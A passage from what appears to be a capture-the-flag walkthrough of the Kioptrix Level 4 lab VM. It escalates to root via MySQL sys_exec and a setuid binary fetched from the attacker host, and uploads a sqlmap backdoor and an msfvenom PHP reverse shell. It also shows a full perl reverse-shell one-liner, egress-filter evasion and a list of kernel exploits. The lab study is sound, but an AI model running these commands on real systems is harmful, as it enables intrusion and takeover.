    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>drwxr-xr-x  4 root root  4096 Feb  6  2012 root</div>
    </div>
    <div><br /></div>
    <div>...as well as the congrats.txt file...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/root$ cat congrats.txt</div>
        <div>cat congrats.txt</div>
        <div>Congratulations!</div>
        <div>You've got root.</div>
        <div>
            <div><br /></div>
        </div>
        <div>There is more then one way to get root on this system. Try and find them.</div>
        <div>I've only tested two (2) methods, but it doesn't mean there aren't more.</div>
        <div>As always there's an easy way, and a not so easy way to pop this box.</div>
        <div>Look for other methods to get root privileges other than running an exploit.</div>
        <div>
            <div><br /></div>
        </div>
        <div>It took a while to make this. For one it's not as easy as it may look, and</div>
        <div>also work and family life are my priorities. Hobbies are low on my list.</div>
        <div>Really hope you enjoyed this one.</div>
        <div>
            <div><br /></div>
        </div>
        <div>If you haven't already, check out the other VMs available on:</div>
        <div>www.kioptrix.com</div>
        <div>
            <div><br /></div>
        </div>
        <div>Thanks for playing,</div>
        <div>loneferret</div>
    </div>
    <div><br /></div>
    <div>The root directory also contains a lshell-0.9.12 directory. Checking the exploit database, we have a known remote code execution issue with LShell.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>LShell 0.9.15 - Remote Code Execution                                                                        | exploits/linux/remote/39632.py</div>
    </div>
    <div><br /></div>
    <div>Looking through the exploit code, it essentially uses python to SSH to the machine and then run "echo os.system('/bin/bash’)"... like we did earlier.</div>
    <div><br /></div>
    <div><br /></div>
    <div>So... even though we seem to have what we wanted from /root, we don’t have root. I’ll keep working to gain root access to the box.</div>
    <div><br /></div>
    <div>I was able to find credentials for the MySQL service in the checklogin.php page under /var/www.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/var/www$ cat checklogin.php</div>
        <div>&lt;?php</div>
        <div>ob_start();</div>
        <div>$host="localhost"; // Host name</div>
        <div>$username="root"; // Mysql username</div>
        <div>$password=""; // Mysql password</div>
        <div>$db_name="members"; // Database name</div>
        <div>$tbl_name="members"; // Table name</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>The mysqld service is running as root...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/var/www$ ps aux | grep -i mysql</div>
        <div>root      4544  0.0  0.1   1772   528 ?        S    10:16   0:00 /bin/sh /usr/bin/mysqld_safe</div>
        <div>root      4586  0.0  3.3 127092 17388 ?        Sl   10:16   0:07 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock</div>
    </div>
    <div><br /></div>
    <div>...so we’ll try to use MySQL to elevate privileges.</div>
    <div><br /></div>
    <div>Checking the /usr/lib directory, we see that the LIB_MYSQLUDF_SYS library is available.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/usr/lib$ ls | grep -i mysql</div>
        <div>lib_mysqludf_sys.so</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>This library will allow us to execute system commands from within MySQL using the ‘sys_exec’ function. Being able to get root when you can execute commands as root is pretty easy. There are lots of ways we can do it. To get a fully elevated shell, we’ll create a ‘getroot’ program using the following C code</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>#include &lt;unistd.h&gt;</div>
        <div>
            <div><br /></div>
        </div>
        <div>main( int argc, char ** argv, char ** envp )</div>
        <div>{</div>
        <div>    setgid(0);</div>
        <div>    setuid(0);</div>
        <div>    system("/bin/bash", argv, envp);</div>
        <div>    return 0;</div>
        <div>}</div>
    </div>
    <div><br /></div>
    <div>Our victim doesn’t have tools to compile code, so we’ll have to cross-compile it on our attacking machine and transfer it to the victim. Then, we can run sys_exec to have root take ownership of it and set the “sticky bit”.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# gcc -m32 -o getroot getroot.c </div>
        <div>getroot.c:3:1: warning: return type defaults to ‘int’ [-Wimplicit-int]</div>
        <div> main( int argc, char ** argv, char ** envp )</div>
        <div> ^~~~</div>
        <div>getroot.c: In function ‘main’:</div>
        <div>getroot.c:7:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</div>
        <div>     system("/bin/bash", argv, envp);</div>
        <div>     ^~~~~~</div>
    </div>
    <div><br /></div>
    <div>Now, I'll transfer it to the victim (using python’s SimpleHTTPServer) and change its owner and permissions (using mysql + sys_exec).</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/$ cd /tmp</div>
        <div>john@Kioptrix4:/tmp$ wget -O getroot 10.183.0.222:432/getroot</div>
        <div>--17:37:47--  http://10.183.0.222:432/getroot</div>
        <div>           =&gt; `getroot'</div>
        <div>Connecting to 10.183.0.222:432... connected.</div>
        <div>HTTP request sent, awaiting response... 200 OK</div>
        <div>Length: 15,520 (15K) [application/octet-stream]</div>
        <div>
            <div><br /></div>
        </div>
        <div>100%[====================================&gt;] 15,520        --.--K/s</div>
        <div>
            <div><br /></div>
        </div>
        <div>17:37:47 (4.89 MB/s) - `getroot' saved [15520/15520]</div>
        <div><br /></div>
        <div>john@Kioptrix4:/tmp$ mysql -u root -p</div>
        <div>Enter password: </div>
        <div>
            <div><br /></div>
        </div>
        <div>Welcome to the MySQL monitor.  Commands end with ; or \g.</div>
        <div>Your MySQL connection id is 1383</div>
        <div>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</div>
        <div>
            <div><br /></div>
        </div>
        <div>Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</div>
        <div>
            <div><br /></div>
        </div>
        <div>mysql&gt; select sys_exec('chown root:root /tmp/getroot; chmod 4755 /tmp/getroot');</div>
        <div>&lt;wn root:root /tmp/getroot; chmod 4755 /tmp/getroot');                       </div>
        <div>+-------------------------------------------------------------------+</div>
        <div>| sys_exec('chown root:root /tmp/getroot; chmod 4755 /tmp/getroot') |</div>
        <div>+-------------------------------------------------------------------+</div>
        <div>| NULL                                                              | </div>
        <div>+-------------------------------------------------------------------+</div>
        <div>1 row in set (0.00 sec)</div>
    </div>
    <div><br /></div>
    <div>Now, if we check the permissions on our ‘getroot’ program...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/tmp$ ls -l</div>
        <div>total 40</div>
        <div>-rwsr-xr-x 1 root     root     15520 May 13  2019 getroot</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>Looks like we are good to go...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:/tmp$ ./getroot</div>
        <div>root@Kioptrix4:/tmp# id</div>
        <div>uid=0(root) gid=0(root) groups=33(www-data)</div>
    </div>
    <div><br /></div>
    <div>Finally! We have root.</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Pivoting</h2></div>
    <div>N/A</div>
    <div><br /></div>
    <div><h2>Clean Up</h2></div>
    <div><br /></div>
    <div>*** STOP /tmp/session.www-data ***</div>
    <div>*** REMOVE /tmp/session.www-data ***</div>
    <div>*** REMOVE /var/www/rev.php ***</div>
    <div>*** REMOVE /tmp/getroot ***</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Additional Info</h2></div>
    <div><br /></div>
    <div><b>sqlmap shell</b></div>
    <div><br /></div>
    <div>Revisiting the SQL injection issue, I wanted to see if I could use it to gain a remote shell.</div>
    <div><br /></div>
    <div>Trying the following sqlmap command...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="<a href="http://10.183.0.216/checklogi">http://10.183.0.216/checklogi</a></div>
        <div>n.php" -v3 --dbms=mysql --time-sec=1 --os-shell</div>
        <div>[...snip...]</div>
        <div>[15:51:34] [INFO] the file stager has been successfully uploaded on '/var/www/' - <a href="http://10.183.0.216:80/tmpuylbb.php">http://10.183.0.216:80/tmpuylbb.php</a></div>
        <div>[...snip...]</div>
        <div>[15:51:48] [INFO] the backdoor has been successfully uploaded on '/var/www/' - <a href="http://10.183.0.216:80/tmpboflq.php">http://10.183.0.216:80/tmpboflq.php</a></div>
        <div>[15:51:48] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER</div>
        <div>os-shell&gt; id</div>
        <div>do you want to retrieve the command standard output? [Y/n/a] </div>
        <div>command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'</div>
    </div>
    <div><br /></div>
    <div>We have a shell with the 'www-data’ user! 😄 Another nice thing is sqlmap created a file uploader for us.</div>
    <div><br /></div>
    <div><a href="http://10.183.0.216/tmpuylbb.php">http://10.183.0.216/tmpuylbb.php</a></div>
    <div><br /></div>
    <div><img class="retina" src="/assets/images/2019-05-14-kioptrix-level-1.3/B0080AA0-AC99-457A-89B7-3C3B70DE29CC.png" /></div>
    <div><br /></div>
    <div>Now we can create our PHP reverse shell using msfvenom and upload it.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
        <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
        <div>[-] No arch selected, selecting arch: php from the payload</div>
        <div>No encoder or badchars specified, outputting raw payload</div>
        <div>Payload size: 3012 bytes</div>
    </div>
    <div><br /></div>
    <div>I’ll start my PHP reverse shell listener and regular reverse shell listener in Metasploit.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>msf5 &gt; use exploit/multi/handler</div>
        <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
        <div>payload =&gt; php/reverse_php</div>
        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
        <div>LHOST =&gt; 10.183.0.222</div>
        <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
        <div>LPORT =&gt; 5432</div>
        <div>msf5 exploit(multi/handler) &gt; run -j</div>
        <div>[*] Exploit running as background job 1.</div>
        <div>[*] Exploit completed, but no session was created.</div>
        <div><br /></div>
        <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
        <div>msf5 exploit(multi/handler) &gt; </div>
        <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
        <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
        <div>payload =&gt; generic/shell_reverse_tcp</div>
        <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
        <div>LHOST =&gt; 10.183.0.222</div>
        <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
        <div>LPORT =&gt; 5433</div>
        <div>msf5 exploit(multi/handler) &gt; run -j</div>
        <div>[*] Exploit running as background job 2.</div>
        <div>[*] Exploit completed, but no session was created.</div>
        <div><br /></div>
        <div>[*] Started reverse TCP handler on 10.183.0.222:5433 </div>
    </div>
    <div><br /></div>
    <div>OK. So the upload process is going to be multi-step since the regular www-data user can’t write to /var/www. We have to first use the sqlmap file uploader to create an upload file “stub” with the proper permissions (but will have zero length). Then we can use the file upload interface to overwrite that file with the “content”.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="<a href="http://10.183.0.216/checklogin.php">http://10.183.0.216/checklogin.php</a>" -v3 --dbms=mysql --time-sec=1 --file-dest="/var/www/rev.php" --file-write="rev.php"</div>
    </div>
    <div><br /></div>
    <div>This will say that it failed to upload the file, but if we use our sqlmap shell, we can see it created an empty file with writable permissions.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>os-shell&gt; ls -laF</div>
        <div>do you want to retrieve the command standard output? [Y/n/a] </div>
        <div>command standard output:</div>
        <div>---</div>
        <div>[...snip...]</div>
        <div>-rw-rw-rw-  1 root root    0 May 13 12:23 rev.php</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>Now, if we upload the same file using the web file upload, we get the following message.</div>
    <div><br /></div>
    <div><img class="retina" src="/assets/images/2019-05-14-kioptrix-level-1.3/2BF6D6E5-D3AF-4AB5-94DD-5E584E4BB40A.png" /></div>
    <div><br /></div>
    <div>And if we check the file again using the sqlmap shell...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>os-shell&gt; ls -laF</div>
        <div>do you want to retrieve the command standard output? [Y/n/a] </div>
        <div>command standard output:</div>
        <div>---</div>
        <div>[...snip...]</div>
        <div>-rw-rw-rw-  1 root root 3012 May 13 12:27 rev.php</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>Now we should be able to browse to our reverse shell page and have it connect back to our Metasploit listener.</div>
    <div><br /></div>
    <div>Or not... our script didn’t connect back to us. The victim might have egress filtering enabled. We’ll try to change the reverse shell connection port to something common (like TCP port 443). That means recreating our reverse shell code with msfvenom and reuploading it... and restarting Metasploit listeners...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:443 -&gt; 10.183.0.216:60426) at 2019-05-13 16:40:10 -0500</div>
        <div><br /></div>
        <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
        <div>[*] Starting interaction with 1...</div>
        <div><br /></div>
        <div>pwd</div>
        <div>/var/www</div>
        <div>id</div>
        <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
    </div>
    <div><br /></div>
    <div>...but it worked! 😄</div>
    <div><br /></div>
    <div>Now let’s see if we can figure out what firewall rules are in place, so we can pick an alternate port for our regular reverse shell.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>cat /etc/iptables.rules</div>
        <div># Generated by iptables-save v1.3.8 on Mon Feb  6 20:00:52 2012</div>
        <div>*filter</div>
        <div>:INPUT ACCEPT [6150:1120650]</div>
        <div>:FORWARD ACCEPT [0:0]</div>
        <div>:OUTPUT ACCEPT [969:93214]</div>
        <div>-A INPUT -p tcp -m tcp --dport 4444 -j DROP </div>
        <div>-A INPUT -p tcp -m tcp --dport 1337:6000 -j DROP </div>
        <div>-A INPUT -p tcp -m tcp --dport 10000:31337 -j DROP </div>
        <div>-A INPUT -p tcp -m tcp --dport 8080 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 4444 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 1337:6000 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 10000:31337 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 8080 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 80 -j DROP </div>
        <div>-A OUTPUT -p tcp -m tcp --dport 21 -j DROP </div>
        <div>COMMIT</div>
        <div># Completed on Mon Feb  6 20:00:52 2012</div>
    </div>
    <div><br /></div>
    <div>Looks like we have lots of options, just not in the range we happened to be working in. We’ll select 444 for our regular reverse shell. We’ll restart a listener on TCP port 444 and then run our perl reverse shell command.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>perl -e 'use Socket;$i="10.183.0.222";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
        <div>[*] Command shell session 2 opened (10.183.0.222:444 -&gt; 10.183.0.216:46416) at 2019-05-13 16:44:37 -0500</div>
    </div>
    <div><br /></div>
    <div>Great! Now we have a stable reverse shell as the www-data user.</div>
    <div><br /></div>
    <div><br /></div>
    <div><b>Kernel Exploits</b></div>
    <div><br /></div>
    <div>The version of kernel in use has several possible local privilege escalation exploits. I pulled several from the exploit database...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>Linux Kernel 2.6.0 &lt; 2.6.31 - 'pipe.c' Local Privilege Escalation (1)                                        | exploits/linux/local/33321.c</div>
        <div>Linux Kernel 2.6.10 &lt; 2.6.31.5 - 'pipe.c' Local Privilege Escalation                                         | exploits/linux/local/40812.c</div>
        <div>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd M | exploits/linux/local/40839.c</div>
        <div>Linux Kernel 2.6.22 &lt; 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID M | exploits/linux/local/40616.c</div>
        <div>Linux Kernel &lt; 2.6.28 - 'fasync_helper()' Local Privilege Escalation                                         | exploits/linux/local/33523.c</div>
        <div>Linux Kernel &lt; 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Escalation                         | exploits/linux/local/17787.c</div>
        <div>Linux Kernel &lt; 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege Escalation                     | exploits/linux/local/14814.c</div>
        <div>Linux Kernel &lt; 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege Escalation                       | exploits/linux_x86-64/local/15023.c</div>
        <div>Linux Kernel &lt; 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation                                  | exploits/linux/local/15774.c</div>
        <div>Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Local Privilege  | exploits/linux/local/45516.c</div>
        <div>Linux Kernel 2.6.x (Gentoo 2.6.29rc1) - 'ptrace_attach' Local Privilege Escalation                           | exploits/linux/local/8673.c</div>
        <div>Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escalation (2)                                                 | exploits/linux/local/33322.c</div>
        <div>Linux Kernel 2.6.x - Ptrace Privilege Escalation                                                             | exploits/linux/local/30604.c</div>
        <div>Linux Kernel 2.6.x - 'SYS_EPoll_Wait' Local Integer Overflow / Local Privilege Escalation (1)                | exploits/linux/local/25202.c</div>
    </div>
    <div><br /></div>
    <div>As well as from running the “Linux_Exploit_Suggester.pl”.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# perl /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k '2.6.24'</div>
        <div>
            <div><br /></div>
        </div>
        <div>Kernel local: 2.6.24</div>
        <div>
            <div><br /></div>
        </div>
        <div>Possible Exploits:</div>
        <div>[+] half_nelson</div>
        <div>   Alt: econet    CVE-2010-3848</div>
        <div>   Source: http://www.exploit-db.com/exploits/6851</div>
        <div>[+] pipe.c_32bit</div>
        <div>   CVE-2009-3547</div>
        <div>   Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c</div>
        <div>[+] american-sign-language</div>
        <div>   CVE-2010-4347</div>
        <div>   Source: http://www.securityfocus.com/bid/45408/</div>
        <div>[+] half_nelson2</div>
        <div>   Alt: econet    CVE-2010-3850</div>
        <div>   Source: http://www.exploit-db.com/exploits/17787/</div>
        <div>[+] pktcdvd</div>
        <div>   CVE-2010-3437</div>
        <div>   Source: http://www.exploit-db.com/exploits/15150/</div>
        <div>[+] can_bcm</div>
        <div>   CVE-2010-2959</div>
        <div>   Source: http://www.exploit-db.com/exploits/14814/</div>
        <div>[+] vmsplice2</div>
        <div>   Alt: diane_lane    CVE-2008-0600</div>
        <div>   Source: http://www.exploit-db.com/exploits/5093</div>
        <div>[+] reiserfs</div>
        <div>   CVE-2010-1146</div>
        <div>   Source: http://www.exploit-db.com/exploits/12130/</div>
        <div>[+] sock_sendpage</div>
        <div>   Alt: wunderbar_emporium    CVE-2009-2692</div>
        <div>   Source: http://www.exploit-db.com/exploits/9435</div>
        <div>[+] half_nelson1</div>
        <div>   Alt: econet    CVE-2010-3848</div>
        <div>   Source: http://www.exploit-db.com/exploits/17787/</div>
        <div>[+] sock_sendpage2</div>
        <div>   Alt: proto_ops    CVE-2009-2692  </div>
        <div>   Source: http://www.exploit-db.com/exploits/9436</div>
        <div>[+] half_nelson3</div>
        <div>   Alt: econet    CVE-2010-4073</div>
        <div>   Source: http://www.exploit-db.com/exploits/17787/</div>
        <div>[+] do_pages_move</div>
        <div>   Alt: sieve    CVE-2010-0415</div>
        <div>   Source: Spenders Enlightenment   </div>
        <div>[+] video4linux</div>
        <div>   CVE-2010-3081</div>
        <div>   Source: http://www.exploit-db.com/exploits/15024/</div>
        <div>[+] vmsplice1</div>
        <div>   Alt: jessica biel    CVE-2008-0600</div>
        <div>   Source: http://www.expliot-db.com/exploits/5092</div>
    </div>
    <div><br /></div>
    <div>I compiled several locally and transferred them all over to the victim. Running each, I was only able to get one to elevate our privileges.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd M | exploits/linux/local/40839.c</div>
    </div>
    <div><br /></div>
    <div>This is an infamous exploit that works on a wide range of kernels. It replaces the root account in /etc/passwd with an attacker controlled account (‘firefart’ by default). Once you are able to login with the attacker controlled account, you can restore the original passwd file (saved in /tmp).</div>
    <div><br /></div>
    <div>I copied the source file to my working directory and compiled it with the options specified in the file.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# cp /usr/share/exploitdb/exploits/linux/local/40839.c .</div>
